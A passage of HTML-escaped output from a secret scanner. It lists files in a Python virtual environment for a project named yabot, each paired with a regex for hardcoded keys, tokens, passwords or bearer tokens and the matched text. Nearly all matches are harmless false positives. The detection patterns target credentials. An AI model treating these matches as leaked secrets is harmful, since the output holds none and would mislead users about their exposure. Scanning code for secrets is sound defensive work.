&#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth1/rfc5849/authorization_server.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth1/rfc5849/authorization_server.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth1/rfc5849/authorization_server.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/oauth1/rfc5849/parameters.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/integrations/requests_client/oauth2_session.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/integrations/sqla_oauth2/functions.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/integrations/httpx_client/oauth2_client.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/integrations/flask_oauth2/resource_protector.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/authlib/integrations/flask_oauth2/authorization_server.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer Token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_vendor/distlib/locators.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_vendor/distlib/wheel.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_vendor/distlib/wheel.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_internal/locations/__init__.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_internal/locations/__init__.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_internal/locations/__init__.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pip/_internal/utils/misc.py&#x27;, &#x27;(?i)(password|passwd|pwd)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;password&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/sem/util.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/sem/util.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/sem/util.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/tokenize/treebank.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/inference/resolution.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/corpus/reader/toolbox.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/nltk/corpus/reader/toolbox.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pymongo/asynchronous/mongo_client.py&#x27;, &#x27;(?i)(password|passwd|pwd)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;password&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py&#x27;, &#x27;(?i)(password|passwd|pwd)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;password&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dns/rdtypes/svcbbase.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety_schemas/models/base.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;TOKEN&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety_schemas/models/base.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety_schemas/models/base.py&#x27;, &#x27;(?i)api[_-]?key\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;API_KEY = &quot;api_key&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety_schemas/report/schemas/v3_0/main.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety_schemas/report/schemas/v3_0/main.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety_schemas/report/schemas/v3_0/main.py&#x27;, &#x27;(?i)api[_-]?key\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;api_key = &quot;api_key&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/flask/json/tag.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/flask/json/tag.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/flask/json/tag.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/flask/json/tag.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/flask/json/tag.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/flask/json/tag.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/flask/json/tag.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/discord.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/discord.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/telegram.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/telegram.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/slack.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/tqdm/contrib/slack.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/openapi/models.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;Key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/openapi/models.py&#x27;, &#x27;(?i)api[_-]?key\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;apiKey = &quot;apiKey&quot;&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/openapi/utils.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/__init__.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer as&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/__init__.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer\nfrom&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/__init__.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer as&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/__init__.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer\nfrom&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/__init__.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer as&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/__init__.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer\nfrom&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/api_key.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/api_key.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/api_key.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/http.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer as&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/http.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/http.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer deadbeef12346&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/http.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/http.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/http.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer\n\n    app&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/http.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/http.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/http.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/http.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;Bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/oauth2.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/fastapi/security/oauth2.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/v1/class_validators.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/v1/class_validators.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/v1/utils.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/v1/mypy.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/v1/mypy.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/_internal/_discriminated_union.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/_internal/_core_utils.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/pydantic/_internal/_core_utils.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/gevent/monkey/__init__.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/dateutil/parser/_parser.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/apscheduler/jobstores/redis.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/apscheduler/jobstores/redis.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/py/_path/svnwc.py&#x27;, &#x27;(?i)(password|passwd|pwd)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;password&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/py/_path/svnwc.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/docker/context/context.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/formatting.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/utils/serialization.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/dispatcher/middlewares/user_context.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/dispatcher/middlewares/user_context.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/dispatcher/middlewares/user_context.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/aiogram/dispatcher/middlewares/user_context.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/httpx/_transports/wsgi.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/init/main.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/init/main.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/init/main.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;KEY&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/auth/utils.py&#x27;, &#x27;(?i)bearer\\s+[a-zA-Z0-9_\\-\\.]+&#x27;, &#x27;bearer authentication.&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/scan/util.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;token&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/scan/util.py&#x27;, &#x27;(?i)(secret|key|token)\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;key&#x27;), (&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/safety/scan/util.py&#x27;, &#x27;(?i)api[_-]?key\\s*=\\s*[&quot;\\\&#x27;][^&quot;\\\&#x27;]+[&quot;\\\&#x27;]&#x27;, &#x27;api_key = &quot;api_key&quot;&#x27;), 